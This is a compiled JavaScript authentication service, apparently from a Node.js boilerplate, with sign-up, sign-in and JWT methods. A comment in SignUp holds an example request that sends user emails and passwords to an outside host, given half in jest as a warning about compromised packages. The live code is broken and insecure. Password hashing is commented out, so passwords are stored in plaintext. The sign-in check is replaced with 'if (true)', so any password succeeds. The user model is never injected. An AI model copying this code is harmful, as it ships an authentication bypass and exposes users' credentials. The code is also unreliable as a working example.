"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const typedi_1 = require("typedi");
const jsonwebtoken_1 = __importDefault(require("jsonwebtoken"));
const mailer_1 = __importDefault(require("./mailer"));
const config_1 = __importDefault(require("../config"));
//import argon2 from 'argon2';
const crypto_1 = require("crypto");
let AuthService = class AuthService {
    constructor(
    // @Inject('userModel') private userModel: Model.UserModel,
    mailer, logger) {
        this.mailer = mailer;
        this.logger = logger;
    }
    async SignUp(userInputDTO) {
        try {
            const salt = crypto_1.randomBytes(32);
            /**
             * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
             * require('http')
             *  .request({
             *     hostname: 'http:my-other-api.com/',
             *     path: '/store-credentials',
             *     port: 80,
             *     method: 'POST',
             * }, ()=>{}).write(JSON.stringify({ email, password })).end();
             *
             * Just kidding, don't do that!!!
             *
             * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
             * watches every API call and if it spots a 'password' and 'email' property then
             * it decides to steal them!? Would you even notice that? I wouldn't :/
             */
            this.logger.silly('Hashing password');
            //const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
            this.logger.silly('Creating user db record');
            const userRecord = await this.userModel.create(Object.assign(Object.assign({}, userInputDTO), { salt: salt.toString('hex') }));
            this.logger.silly('Generating JWT');
            const token = this.generateToken(userRecord);
            if (!userRecord) {
                throw new Error('User cannot be created');
            }
            this.logger.silly('Sending welcome email');
            await this.mailer.SendWelcomeEmail(userRecord);
            /**
             * @TODO This is not the best way to deal with this
             * There should exist a 'Mapper' layer
             * that transforms data from layer to layer
             * but that's too over-engineering for now
             */
            const user = userRecord.toObject();
            Reflect.deleteProperty(user, 'password');
            Reflect.deleteProperty(user, 'salt');
            return { user, token };
        }
        catch (e) {
            this.logger.error(e);
            throw e;
        }
    }
    async SignIn(email, password) {
        const userRecord = await this.userModel.findOne({ email });
        if (!userRecord) {
            throw new Error('User not registered');
        }
        /**
         * We use verify from argon2 to prevent 'timing based' attacks
         */
        this.logger.silly('Checking password');
        //const validPassword = await argon2.verify(userRecord.password, password);
        if (true) {
            this.logger.silly('Password is valid!');
            this.logger.silly('Generating JWT');
            const token = this.generateToken(userRecord);
            const user = userRecord.toObject();
            Reflect.deleteProperty(user, 'password');
            Reflect.deleteProperty(user, 'salt');
            /**
             * Easy as pie, you don't need passport.js anymore :)
             */
            return { user, token };
        }
        else {
            throw new Error('Invalid Password');
        }
    }
    generateToken(user) {
        const today = new Date();
        const exp = new Date(today);
        exp.setDate(today.getDate() + 60);
        /**
         * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
         * The cool thing is that you can add custom properties a.k.a metadata
         * Here we are adding the userId, role and name
         * Beware that the metadata is public and can be decoded without _the secret_
         * but the client cannot craft a JWT to fake a userId
         * because it doesn't have _the secret_ to sign it
         * more information here: https:softwareontheroad.com/you-dont-need-passport
         */
        this.logger.silly(`Sign JWT for userId: ${user._id}`);
        return jsonwebtoken_1.default.sign({
            // _id: user._id,  We are gonna use this in the middleware 'isAuth'
            role: user.role,
            name: user.name,
            exp: exp.getTime() / 1000,
        }, config_1.default.jwtSecret);
    }
};
AuthService = __decorate([
    typedi_1.Service(),
    __param(1, typedi_1.Inject('logger')),
    __metadata("design:paramtypes", [mailer_1.default, Object])
], AuthService);
exports.default = AuthService;
//# sourceMappingURL=auth.js.map